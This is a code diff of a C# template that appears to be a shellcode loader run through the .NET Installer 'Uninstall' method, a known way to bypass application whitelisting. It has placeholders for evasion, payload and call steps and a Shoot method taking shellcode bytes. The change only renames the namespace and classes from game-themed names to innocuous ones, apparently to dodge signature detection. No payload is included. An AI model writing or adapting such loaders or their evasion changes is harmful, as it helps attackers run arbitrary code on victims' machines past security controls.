@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Configuration.Install;
-using StreetFighterAlpha;
+using MyInstUtlsBps;
 
 //####INCLUDE####
 
@@ -19,17 +19,17 @@ public class Sample : System.Configuration.Install.Installer
     //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
-        var ryu = new Ryu(new string[]{});
+        var InstinctDo = new InstinctDo(new string[]{});
     }
 }
 
-namespace StreetFighterAlpha
+namespace MyInstUtlsBps
 {
     //####CODE####
 
-    public class Ryu
+    public class InstinctDo
     {
-        public Ryu(string[] args)
+        public InstinctDo(string[] args)
         {
             //####EVASION####
 
@@ -37,11 +37,11 @@ namespace StreetFighterAlpha
 
             //####CALL####
 
-            Hadoken.Shoot(buf, args);
+            PlayGames.Shoot(buf, args);
         }
     }
 
-    public static class Hadoken
+    public static class PlayGames
     {
 
         public static void Shoot(byte[] shellcode, string[] args)
